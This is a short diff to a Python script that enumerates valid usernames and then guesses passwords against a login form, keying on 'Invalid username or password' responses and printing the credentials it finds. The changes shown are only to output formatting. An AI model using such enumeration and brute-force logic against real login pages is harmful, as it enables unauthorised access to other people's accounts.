@@ -50,7 +50,7 @@ def user_enum():
         if 'Invalid username or password.' in resp.text:
             print(f'[-] Invalid Username:  {username}')
         else:
-            print(f'\n Valid Username: {username}\n\t')
+            print(f'\n Valid Username: {username}\n')
             valid_user.append(username)
             break
 
@@ -67,11 +67,11 @@ def pass_enum():
         if 'Invalid username or password' in resp.text:
             print (f'[-] Invalid password: {passwd} ')
         else:
-            print(f'Valid Password: {passwd}')
+            print(f'\nValid Password: {passwd}\n')
             valid_passwd.append(passwd)
             break
 
 user_enum()
 pass_enum()
 
-print(f'Credintional Found \nUsername: {valid_user[0]}\nPassword: {valid_passwd[0]}')
+print(f'\n\tCredintional Found \nUsername: {valid_user[0]}\nPassword: {valid_passwd[0]}')
